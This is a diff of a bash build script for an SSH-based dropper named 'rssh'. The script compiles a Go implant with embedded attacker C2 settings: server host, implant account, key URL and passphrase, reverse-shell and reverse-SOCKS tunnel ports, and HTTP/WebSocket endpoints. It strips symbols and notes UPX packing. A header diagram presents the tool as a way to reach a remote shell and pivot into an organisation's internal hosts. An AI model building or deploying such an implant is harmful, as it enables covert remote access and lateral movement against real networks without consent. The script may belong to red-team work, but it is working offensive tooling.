@@ -1,33 +1,79 @@
 #!/bin/bash
 
+# [Organization]  ----- |Internet| ------ [Attacker C2]
+#
+#      (Dropper)  ------ Call back ------> SSH Server -------------------|
+#                                                                        |  Attacker SSH shell client
+# 1. Internal Host <==== SSH Client <= Reverse Shell ==== SSH Server ----|
+#                                                                        |  Attacker Browser+SOCKS
+# 2. Internal Hosts N <==== SSH Client <= Reverse SOCKS ==== SSH Server -|
+#    Internal Hosts N+1
 
-serverPort=22
-serverHost=192.168.88.15
-serverUser=tester
-serverUserKeyUrl="http://127.0.0.1:9000/id_rsa_test_enc"
-serverUserKeyPassphrase=password1
-remoteCmdHost=127.0.0.1
-remoteCmdPort=2022
-remoteCmdUser=operator
-remoteCmdPwd=$( date | shasum | cut -d" " -f1)
-remoteSocksHost=127.0.0.1
-remoteSocksPort=1080
+# SSH SSHServer (host)
+SSHServerHost=172.16.56.230
 
+# SSH SSHServer (port)
+SSHServerPort=22
+
+# Attacker Implant SSH account
+SSHServerUser=tester
+
+# Implant SSH key
+SSHServerUserKeyUrl="http://127.0.0.1:9000/id_rsa_test_enc"
+
+# Implant SSH password (wire)
+# TODO: need to decide if wire protection on a non-passphrased key is ok, or need passphrase on the key itself
+SSHServerUserKeyPassphrase=password1
+
+# Channel IP for reverse tunnel (addr)
+SSHRemoteCmdHost=127.0.0.1
+
+# Channel IP for reverse tunnel (port)
+SSHRemoteCmdPort=2022
+
+# Channel IP for reverse tunnel SOCKS (addr)
+SSHRemoteSocksHost=127.0.0.1
+
+# Channel IP for reverse tunnel SOCKS (port)
+SSHRemoteSocksPort=1080
+
+# Operator Implant logon (user)
+SSHRemoteCmdUser=operator
+
+# Operator Implant logon (password)
+# TODO: Randomize
+SSHRemoteCmdPwd=$( date | shasum | cut -d" " -f1)
+
+#--------------- Transport ------------------#
+# HTTP/S proxy:
+HTTPProxy="http://127.0.0.1:8088"
+
+# WS/WSS endpoint:
+HTTPEndpoint="http://127.0.0.1:8080"
+
+# WS/WSS endpoint:
+WSEndpoint="wss://127.0.0.1:8080/stream"
+
+# Implant Exe name
 dropperName="rssh"
 
 echo "[*] Building dropper"
 go build -ldflags \
-    "-X main.serverPort=${serverPort}  \
-     -X main.serverHost=${serverHost} \
-     -X main.serverUser=${serverUser} \
-     -X main.serverUserKeyUrl=${serverUserKeyUrl} \
-     -X main.serverUserKeyPassphrase=${serverUserKeyPassphrase} \
-     -X main.remoteCmdHost=${remoteCmdHost}  \
-     -X main.remoteCmdPort=${remoteCmdPort} \
-     -X main.remoteCmdUser=${remoteCmdUser} \
-     -X main.remoteCmdPwd=${remoteCmdPwd} \
-     -X main.remoteSocksHost=${remoteSocksHost} \
-     -X main.remoteSocksPort=${remoteSocksPort}" \
+	"-s -w \
+     -X main.SSHServerPort=${SSHServerPort}  \
+     -X main.SSHServerHost=${SSHServerHost} \
+     -X main.SSHServerUser=${SSHServerUser} \
+     -X main.SSHServerUserKeyUrl=${SSHServerUserKeyUrl} \
+     -X main.SSHServerUserKeyPassphrase=${SSHServerUserKeyPassphrase} \
+     -X main.SSHRemoteCmdHost=${SSHRemoteCmdHost}  \
+     -X main.SSHRemoteCmdPort=${SSHRemoteCmdPort} \
+     -X main.SSHRemoteCmdUser=${SSHRemoteCmdUser} \
+     -X main.SSHRemoteCmdPwd=${SSHRemoteCmdPwd} \
+     -X main.SSHRemoteSocksHost=${SSHRemoteSocksHost} \
+     -X main.SSHRemoteSocksPort=${SSHRemoteSocksPort} \
+     -X main.HTTPProxy=${HTTPProxy} \
+     -X main.HTTPEndpoint=${HTTPEndpoint} \
+     -X main.WSEndpoint=${WSEndpoint}" \
      -o ${dropperName} ./rssh.go \
      ./types.go ./vars.go ./Pty.go ./socksport.go ./keymgmt.go ./traffic.go
 
@@ -36,20 +82,26 @@ then
     echo "[*] Dropper Information (keep it safe):"
     printf "    %s\n" "#######################"
     printf "    %s\n" "Dropper File: ${dropperName} ($(stat -f '%z bytes' ${dropperName}))"
-    printf "    %s\n" "SSH serverHost=${serverHost}"
-    printf "    %s\n" "SSH serverPort=${serverPort}"
-    printf "    %s\n" "SSH serverUser=${serverUser}"
-    printf "    %s\n" "SSH serverUserKeyUrl=${serverUserKeyUrl}"
-    printf "    %s\n" "SSH serverUserKeyPassphrase=${serverUserKeyPassphrase}"
-    printf "    %s\n" "SSH-RT remoteCmdHost=${remoteCmdHost}"
-    printf "    %s\n" "SSH-RT remoteCmdPort=${remoteCmdPort}"
-    printf "    %s\n" "SSH-RT remoteCmdUser=${remoteCmdUser}"
-    printf "    %s\n" "SSH-RT remoteCmdPwd=${remoteCmdPwd}"
-    printf "    %s\n" "SSH-RTS remoteSocksHost=${remoteSocksHost}"
-    printf "    %s\n" "SSH-RTS remoteSocksPort=${remoteSocksPort}"
-    printf "    %s\n" "SSH-RT shell agent password: ${remoteCmdPwd} "
+    printf "    %s\n" "SSH SSHServerHost=${SSHServerHost}"
+    printf "    %s\n" "SSH SSHServerPort=${SSHServerPort}"
+    printf "    %s\n" "SSH SSHServerUser=${SSHServerUser}"
+    printf "    %s\n" "SSH SSHServerUserKeyUrl=${SSHServerUserKeyUrl}"
+    printf "    %s\n" "SSH SSHServerUserKeyPassphrase=${SSHServerUserKeyPassphrase}"
+    printf "    %s\n" "SSH-RT SSHRemoteCmdHost=${SSHRemoteCmdHost}"
+    printf "    %s\n" "SSH-RT SSHRemoteCmdPort=${SSHRemoteCmdPort}"
+    printf "    %s\n" "SSH-RT SSHRemoteCmdUser=${SSHRemoteCmdUser}"
+    printf "    %s\n" "SSH-RT SSHRemoteCmdPwd=${SSHRemoteCmdPwd}"
+    printf "    %s\n" "SSH-RTS SSHRemoteSocksHost=${SSHRemoteSocksHost}"
+    printf "    %s\n" "SSH-RTS SSHRemoteSocksPort=${SSHRemoteSocksPort}"
+    printf "    %s\n" "SSH-RT shell agent password: ${SSHRemoteCmdPwd} "
+    printf "    %s\n" "HTTP Proxy: ${HTTPProxy} "
+    printf "    %s\n" "HTTP Endpoint: ${HTTPEndpoint} "
+    printf "    %s\n" "WS Endpoint: ${WSEndpoint} "
     printf "    %s\n" "#######################"
-    printf "\n    %s\n" "   Usage SSH-RT: ssh ${remoteCmdUser}@${remoteCmdHost} -p ${remoteCmdPort} "
-    printf "    %s\n" "   Usage SSH-RTS: browser SOCKS proxy: ${remoteSocksHost}:${remoteSocksPort} "
+    printf "\n    %s\n" "   Usage SSH-RT: ssh ${SSHRemoteCmdUser}@${SSHRemoteCmdHost} -p ${SSHRemoteCmdPort} "
+    printf "    %s\n" "   Usage SSH-RTS: browser SOCKS proxy: ${SSHRemoteSocksHost}:${SSHRemoteSocksPort} "
 fi
 
+
+# upx --brute ./rssh
+# 7.1 vs. 1.7 mb
